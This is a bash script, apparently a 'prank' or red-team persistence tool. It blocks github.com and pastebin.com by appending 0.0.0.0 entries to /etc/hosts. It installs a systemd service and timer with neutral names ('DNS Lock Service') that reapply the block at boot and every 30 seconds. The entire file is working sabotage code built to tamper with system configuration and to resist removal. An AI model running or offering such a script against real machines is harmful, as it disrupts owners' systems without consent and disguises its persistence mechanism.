#!/bin/bash
# systemd_dns.sh

TARGETS=("github.com" "www.github.com" "pastebin.com" "www.pastebin.com")
HOSTS_FILE="/etc/hosts"
MARKER="rit.edu"

apply_prank() {
    for domain in "${TARGETS[@]}"; do
        if ! grep -q "$domain $MARKER" "$HOSTS_FILE"; then
            echo "0.0.0.0 $domain $MARKER" >> "$HOSTS_FILE"
        fi
    done
}

apply_prank

# write the script that the service will call
cat > /usr/local/bin/dns_lock.sh << 'EOF'
#!/bin/bash
for domain in github.com www.github.com pastebin.com www.pastebin.com; do
    grep -q "$domain rit.edu" /etc/hosts || echo "0.0.0.0 $domain rit.edu" >> /etc/hosts
done
EOF
chmod +x /usr/local/bin/dns_lock.sh

# write the service unit
cat > /etc/systemd/system/dns-lock.service << 'EOF'
[Unit]
Description=DNS Lock Service

[Service]
Type=oneshot
ExecStart=/usr/local/bin/dns_lock.sh
EOF

# write the timer unit - fires every 30 seconds
cat > /etc/systemd/system/dns-lock.timer << 'EOF'
[Unit]
Description=DNS Lock Timer

[Timer]
OnBootSec=10
OnUnitActiveSec=30s
AccuracySec=1s

[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload
systemctl enable dns-lock.timer
systemctl start dns-lock.timer